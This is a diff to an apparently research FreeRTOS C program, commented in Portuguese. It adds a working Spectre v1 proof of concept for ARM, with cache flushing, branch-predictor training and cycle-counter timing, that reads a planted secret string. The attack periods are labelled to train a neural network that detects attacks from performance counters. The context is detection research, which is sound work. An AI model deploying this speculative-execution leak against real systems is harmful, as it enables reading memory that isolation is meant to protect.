@@ -1186,7 +1186,7 @@ void task_monitor(void *arg) {
   
   void task_A(void* arg) {
     vTaskDelay(pdMS_TO_TICKS(1000)); 
-    const TickType_t xPeriod = pdMS_TO_TICKS(5000); 
+    const TickType_t xPeriod = pdMS_TO_TICKS(6000); 
     TickType_t xLastWakeTime = xTaskGetTickCount();
     
     while(1) {
@@ -1204,7 +1204,7 @@ void task_monitor(void *arg) {
 
 void task_B(void* arg) {
   vTaskDelay(pdMS_TO_TICKS(2000)); //delay inicial
-  const TickType_t xPeriod = pdMS_TO_TICKS(5000); 
+  const TickType_t xPeriod = pdMS_TO_TICKS(6000); 
   TickType_t xLastWakeTime = xTaskGetTickCount();
 
   while(1) {
@@ -1222,7 +1222,7 @@ void task_B(void* arg) {
 
 void task_benchmark(void* arg) {
   info_t *info = (info_t *)arg; 
-  const TickType_t xPeriod = pdMS_TO_TICKS(5000);
+  const TickType_t xPeriod = pdMS_TO_TICKS(6000);
 
   vTaskDelay(pdMS_TO_TICKS(2000)); 
 
@@ -1272,21 +1272,135 @@ void task_attacker(void *arg) {
   }
 }
 
+//definiçoes necessarias para o spectre
+// extern uint8_t array1[16];
+// extern uint8_t array2[256 * 512];
+// extern char* secret;
+// extern unsigned int array1_size;
+
+unsigned int array1_size = 16;
+uint8_t unused1[64]; // Padding para evitar fetch de cache adjacente
+uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t unused2[64]; 
+uint8_t array2[256 * 512];
+char *secret = "The Magic Words are Squeamish Ossifrage.";
+volatile uint8_t temp_spectre = 0; // Variável para evitar otimização do compilador
+
+void victim_function(size_t x) {
+    if (x < array1_size) {
+        temp_spectre &= array2[array1[x] * 512];
+    }
+}
+
+void read_memory_byte_spectre(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
+    static int results[256];
+    int tries, i, j, k, mix_i;
+    unsigned int junk = 0;
+    size_t training_x, x;
+    uint64_t time1, time2;
+    volatile uint8_t *addr;
+
+    for (i = 0; i < 256; i++) results[i] = 0;
+
+    for (tries = 999; tries > 0; tries--) {
+        //flush array2 da cache
+        for (i = 0; i < 256; i++) {
+            __asm volatile("dc civac, %0" : : "r"(&array2[i * 512]) : "memory");
+        }
+
+        training_x = tries % array1_size;
+        for (j = 29; j >= 0; j--) {
+            //flush array1_size para forçar execuçao especulativa no branch
+            __asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
+            
+            //delay
+            for (volatile int z = 0; z < 100; z++) {}
+
+            //treinamento do preditor
+            //x = training_x se j % 6 != 0, senão malicious_x
+            x = ((j % 6) - 1) & ~0xFFFF;
+            x = (x | (x >> 16));
+            x = training_x ^ (x & (malicious_x ^ training_x));
+
+            victim_function(x); //chhama a função vítima
+        }
+
+        //medicao de tempo
+        for (i = 0; i < 256; i++) {
+            mix_i = ((i * 167) + 13) & 255;
+            addr = &array2[mix_i * 512];
+            
+            //barreiras e leitura do contador de ciclos (cntvct_el0)
+            __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time1) : : "memory");
+            junk = *addr;
+            __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time2) : : "memory");
+            uint64_t diff = time2 - time1;
+
+            if (diff <= (uint64_t)cache_hit_threshold && mix_i != array1[tries % array1_size]) {
+                results[mix_i]++;
+            }
+        }
+        j = k = -1;
+        for (i = 0; i < 256; i++) {
+            if (j < 0 || results[i] >= results[j]) {
+                k = j;
+                j = i;
+            } else if (k < 0 || results[i] >= results[k]) {
+                k = i;
+            }
+        }
+        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+            break;
+    }
+
+    //atribui os valores para que a task_spectre possa imprimir
+    value[0] = (uint8_t)j;
+    score[0] = results[j];
+    value[1] = (uint8_t)k;
+    score[1] = results[k];
+}
+
+void task_spectre(void *arg) {
+    vTaskDelay(pdMS_TO_TICKS(3000));
+    const TickType_t xPeriod = pdMS_TO_TICKS(6000); 
+    TickType_t xLastWakeTime = xTaskGetTickCount();
+    
+    //configurações do ataque
+    int cache_hit_threshold = 20;
+    size_t malicious_x = (size_t)(secret - (char *)array1);
+    uint8_t value[2];
+    int score[2];
+
+    while(1) {
+        vTaskDelayUntil(&xLastWakeTime, xPeriod);
+
+        g_label_atual = 1.0f; //sinaliza ataque para a FANN
+        printf("[SPECTRE] Iniciando extração de dados especulativa...\n");
+
+        for (int i = 0; i < 10; i++) { //tenta ler os primeiros 10 bytes do segredo
+            read_memory_byte_spectre(cache_hit_threshold, malicious_x++, value, score);
+            printf("[SPECTRE] Lendo: 0x%02X='%c' score=%d\n", value[0], 
+                   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+            fflush(stdout);
+        }
+
+        printf("[SPECTRE] Ciclo de ataque finalizado.\n");
+        fflush(stdout);
+        g_label_atual = 0.0f; //retorna ao estado normal
+    }
+}
+
 void task_random(void* arg) {
   info_t *info = (info_t *)arg;
 
-  // configuracao do ataque
-  const int ARR_SIZE = 64 * 1024; 
-  volatile int *arr = (int*) malloc(ARR_SIZE * sizeof(int));
-  if(arr == NULL) { 
-      printf("[ERRO] Falha no malloc da task_random\n"); 
-      fflush(stdout);
-      vTaskDelete(NULL); //mata a tarefa se não tiver memória
-  }
-  srand(42);
+  //configurações do ataque
+  int cache_hit_threshold = 20;
+  size_t malicious_x = (size_t)(secret - (char *)array1);
+  uint8_t value[2];
+  int score[2];
 
   vTaskDelay(pdMS_TO_TICKS(3000)); //roda no final do ciclo
-  const TickType_t xPeriod = pdMS_TO_TICKS(5000);
+  const TickType_t xPeriod = pdMS_TO_TICKS(6000);
   TickType_t xLastWakeTime = xTaskGetTickCount();
 
   while(1) {
@@ -1300,19 +1414,21 @@ void task_random(void* arg) {
       if (info != NULL) info->function.pointer(info->function.context);
       fflush(stdout);
     } else {
-      g_label_atual = 1.0f; //ATAQUE
-      printf("rodando ataque\n");
+      g_label_atual = 1.0f; //sinaliza ataque para a FANN
+      printf("[SPECTRE] Iniciando extração de dados especulativa...\n");
+      fflush(stdout);
 
-      TickType_t end = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
-      while(xTaskGetTickCount() < end) {
-        int idx = rand() % ARR_SIZE;
-        arr[idx]++; 
-        if((rand() % 100) > 50) asm("nop"); 
+      for (int i = 0; i < 10; i++) { //tenta ler os primeiros 10 bytes do segredo
+          read_memory_byte_spectre(cache_hit_threshold, malicious_x++, value, score);
+          printf("[SPECTRE] Lendo: 0x%02X='%c' score=%d\n", value[0], 
+                  (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+          fflush(stdout);
       }
+
+      printf("[SPECTRE] Ciclo de ataque finalizado.\n");
       fflush(stdout);
     }
   }
-  free((void*)arr);
 }
 
 
@@ -1333,8 +1449,8 @@ struct fann_train_data* cria_dataset(unsigned int num_amostras) {
       //normalizacao
       data->input[coletados][0] = (fann_type)buffer.data.branch_misses / 2000.0f; 
       data->input[coletados][1] = (fann_type)buffer.data.cache_misses / 5000.0f;
-      data->input[coletados][2] = (fann_type)buffer.data.instructions / 50000.0f;
-      data->input[coletados][3] = (fann_type)buffer.data.cpu_cycles / 100000.0f;
+      data->input[coletados][2] = (fann_type)buffer.data.instructions / 25000.0f;
+      data->input[coletados][3] = (fann_type)buffer.data.cpu_cycles / 40000.0f;
       
       data->output[coletados][0] = (fann_type)buffer.output;
       coletados++;
@@ -1355,8 +1471,8 @@ void task_fann(void *arg) {
     fann_set_activation_function_hidden(ann, FANN_SIGMOID);
     fann_set_activation_function_output(ann, FANN_SIGMOID);
     
-    vTaskDelay(pdMS_TO_TICKS(4000)); //roda no final do ciclo
-    const TickType_t xPeriod = pdMS_TO_TICKS(5000);
+    vTaskDelay(pdMS_TO_TICKS(5000)); //roda no final do ciclo
+    const TickType_t xPeriod = pdMS_TO_TICKS(6000);
     TickType_t xLastWakeTime = xTaskGetTickCount();
     
     int i = 0;
@@ -1449,6 +1565,11 @@ int main(void) {
   
   info_t *info_bench = benchmark_add_info(benchmark, VM_NUM, 0, PERIOD_MS_TASK_ANY);
 
+  //inicializa array2 para o ataque spectre
+  for (int i = 0; i < (int)sizeof(array2); i++) {
+        array2[i] = 1; 
+    }
+
   xTaskCreate(
     task_random,
     "taskRandom",
@@ -1456,7 +1577,17 @@ int main(void) {
     info_bench,
     OTHER_TASK_PRIORITY,
     NULL
-  )/
+  );
+
+
+  // xTaskCreate(
+  //   task_spectre,
+  //   "taskSpectre",
+  //   TASK_STACK_SIZE, //stack maior para lidar com array2 e operacoes
+  //   NULL,
+  //   OTHER_TASK_PRIORITY,
+  //   NULL
+  // );
 
 
   // xTaskCreate(
